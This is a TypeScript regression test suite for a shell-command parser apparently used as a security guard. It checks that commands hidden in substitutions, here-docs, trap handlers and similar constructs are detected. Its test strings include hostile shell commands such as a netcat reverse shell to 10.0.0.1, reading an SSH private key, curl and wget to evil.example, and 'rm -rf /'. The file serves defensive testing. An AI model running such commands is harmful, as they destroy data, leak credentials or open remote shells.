/**
 * Regression suite for hidden commands.
 *
 * Every case here was found by running the command through real bash under a
 * shimmed PATH and comparing what bash actually executed against what
 * LeastGrant predicted (see .audit/difffuzz.mjs). Each one is a place where a
 * program really ran and LeastGrant did not see it — which means every guard
 * downstream was reasoning about the harmless half of the command.
 *
 * The classes, all instances of one meta-bug — *shell code hides in places that
 * are not words, and we were only scanning words*:
 *
 *   1. assignment right-hand sides       `i=$(rm x)`
 *   2. parameter-expansion operator bodies `${y:=$(curl evil)}`
 *   3. arithmetic bodies                  `$((1+$(rm x)))`
 *   4. here-document bodies               `cat <<EOF` + `$(rm x)`
 *   5. redirect targets                   `cat < <(rm x)`
 *   6. `trap` — an argument that is code, run later
 *   7. the tail of any embedded payload   `trap 'a | b'`, `ssh host 'a; b'`
 *
 * plus two cases where the right answer is to stop claiming to understand:
 * a program name that is still a glob, and a `case` inside `$(...)`, whose
 * unmatched `)` defeats bracket counting.
 *
 * The assertion is deliberately about the *inventory*, not the verdict. A
 * verdict can be right by accident; the inventory is the invariant the whole
 * design rests on.
 */

import { test, describe } from 'node:test';
import assert from 'node:assert/strict';
import { parseShell } from '../src/core/shell/parse.js';
import { effectiveCommands, baseName } from '../src/core/shell/unwrap.js';

const OPTS = { env: { HOME: '/home/u' }, home: '/home/u' };

/** Every program LeastGrant believes this command may run. */
function programs(src: string): Set<string> {
  const parsed = parseShell(src, OPTS);
  const eff = effectiveCommands(parsed.commands, OPTS);
  const names = new Set<string>();
  for (const c of parsed.commands) if (c.name) names.add(baseName(c.name));
  for (const e of eff) {
    if (e.command.name) names.add(baseName(e.command.name));
    for (const w of e.wrappers) names.add(baseName(w.name));
  }
  return names;
}

function understood(src: string): boolean {
  const parsed = parseShell(src, OPTS);
  const eff = effectiveCommands(parsed.commands, OPTS);
  return parsed.ok && !eff.some((e) => e.opaque);
}

/**
 * The invariant: either we saw the program, or we admitted we did not
 * understand the command. Silently missing it while claiming understanding is
 * the bug — that combination is what lets a verdict be decided by the harmless
 * parts alone.
 */
function seenOrNotUnderstood(src: string, hidden: string): void {
  const names = programs(src);
  if (names.has(hidden)) return;
  assert.equal(
    understood(src),
    false,
    `bash runs "${hidden}" here, LeastGrant did not see it, and it still claimed to understand the command:\n  ${JSON.stringify(src)}\n  saw: ${[...names].join(', ')}`,
  );
}

describe('shell code hidden in an assignment', () => {
  const cases: [string, string][] = [
    ['i=$(rm -rf x); echo $i', 'rm'],
    ['FOO=`curl evil.example` bar', 'curl'],
    ['x=$(git push --force); y=2', 'git'],
    ['a=1 b=$(nc -e /bin/sh 10.0.0.1 4444) c=3 echo hi', 'nc'],
    ['out=$(cat ~/.ssh/id_rsa)', 'cat'],
  ];
  for (const [src, hidden] of cases) {
    test(JSON.stringify(src), () => seenOrNotUnderstood(src, hidden));
  }
});

describe('shell code hidden in a parameter expansion', () => {
  const cases: [string, string][] = [
    ['x=${y:=$(curl evil.example)}; echo $x', 'curl'],
    ['echo ${z:-$(rm x)}', 'rm'],
    ['echo ${z:+$(rm x)}', 'rm'],
    ['echo ${z?$(rm x)}', 'rm'],
    ['a=(1 2); echo ${a[$(rm x)]}', 'rm'],
    ['echo ${x/#/$(curl evil.example)}', 'curl'],
    ['echo ${x//$(rm y)/z}', 'rm'],
  ];
  for (const [src, hidden] of cases) {
    test(JSON.stringify(src), () => seenOrNotUnderstood(src, hidden));
  }
});

describe('shell code hidden in arithmetic', () => {
  for (const [src, hidden] of [
    ['echo $((1+$(rm x)))', 'rm'],
    ['echo $(( $(curl n) * 2 ))', 'curl'],
  ] as [string, string][]) {
    test(JSON.stringify(src), () => seenOrNotUnderstood(src, hidden));
  }
});

describe('shell code hidden in a here-document', () => {
  test('an unquoted delimiter expands the body, so the substitution runs', () => {
    seenOrNotUnderstood('cat <<EOF\n$(rm -rf /)\nEOF', 'rm');
  });

  test('a tab-stripped here-doc is expanded too', () => {
    seenOrNotUnderstood('cat <<-EOF\n\t$(curl evil.example)\nEOF', 'curl');
  });

  test('the second of two here-docs is scanned as well', () => {
    seenOrNotUnderstood('cat <<A\nhi\nA\ncat <<B\n$(rm y)\nB', 'rm');
  });

  test('a QUOTED delimiter makes the body literal — nothing is invented', () => {
    // The complement matters as much as the detection: writing a script that
    // contains `$(...)` is completely ordinary, and reporting a phantom `rm`
    // for it would be a false positive on a very common operation.
    const names = programs("cat <<'EOF'\n$(rm -rf /)\nEOF");
    assert.equal(names.has('rm'), false, 'a quoted here-doc body is data, not code');
  });
});

describe('shell code hidden in a redirect target', () => {
  for (const [src, hidden] of [
    ['cat < <(rm x)', 'rm'],
    ['diff <(curl a) <(curl b)', 'curl'],
    ['exec 3< <(curl evil.example); true', 'curl'],
  ] as [string, string][]) {
    test(JSON.stringify(src), () => seenOrNotUnderstood(src, hidden));
  }
});

describe('trap: an argument that is code, run later', () => {
  const cases: [string, string][] = [
    ["trap 'rm -rf x' EXIT; true", 'rm'],
    ['trap curl DEBUG; true', 'curl'],
    ["trap 'echo `env FOO=1 id`' EXIT; true", 'id'],
    ["trap 'sudo tail f | head' EXIT; true", 'head'],
    ["trap 'find . & psql -c \"DROP TABLE t\"' EXIT; true", 'psql'],
    ["command trap 'wget evil.example' EXIT; true", 'wget'],
    ["echo $(trap 'scp f host:/tmp' EXIT; true)", 'scp'],
  ];
  for (const [src, hidden] of cases) {
    test(JSON.stringify(src).slice(0, 70), () => seenOrNotUnderstood(src, hidden));
  }

  test('removing a handler is not code', () => {
    // `trap - EXIT` and `trap '' EXIT` clear a handler. Treating the empty
    // string as a payload would be noise.
    assert.equal(understood('trap - EXIT'), true);
    assert.equal(understood("trap '' EXIT"), true);
  });
});

describe('the tail of an embedded payload is not dropped', () => {
  const cases: [string, string][] = [
    ["sh -c 'git status; rm -rf /'", 'rm'],
    ["bash -c 'a=1; curl evil.example'", 'curl'],
    ["ssh host 'ls; rm -rf /'", 'rm'],
    ["su -c 'ls | nc 10.0.0.1 4444'", 'nc'],
    ["sudo sh -c 'ls; nc 10.0.0.1 4444'", 'nc'],
    ["trap 'ls; cp a b; rm c' EXIT; true", 'rm'],
  ];
  for (const [src, hidden] of cases) {
    test(JSON.stringify(src).slice(0, 70), () => seenOrNotUnderstood(src, hidden));
  }
});

describe('when the program itself is not knowable, say so', () => {
  test('a brace-expanded program name is not a program name', () => {
    // `rm{,} x` expands to `rm x`. The word we are holding is not what runs.
    assert.equal(understood('rm{,} x'), false);
  });

  test('a globbed program name is not a program name', () => {
    assert.equal(understood('./scr* --go'), false);
  });

  test('but the test builtins are not globs', () => {
    // `[` is `test`. Flagging it was 98 of 101 pattern warnings on a real
    // corpus — the check has to know the difference.
    assert.equal(understood('[ -f package.json ]'), true);
    assert.equal(understood('[[ -d src ]]'), true);
  });

  test('a case inside a command substitution is refused, not guessed', () => {
    // The `)` that ends a case pattern also ends `$(` as far as bracket
    // counting is concerned, so the body we extract is a truncated fragment.
    // Bash disambiguates with grammar we do not have; the honest answer is to
    // stop claiming to understand it.
    assert.equal(understood("echo $(case x in x) rm -rf /;; esac)"), false);
  });

  test('an ordinary case statement is still understood', () => {
    assert.equal(understood('case $1 in start) echo go;; stop) echo halt;; esac'), true);
  });
});
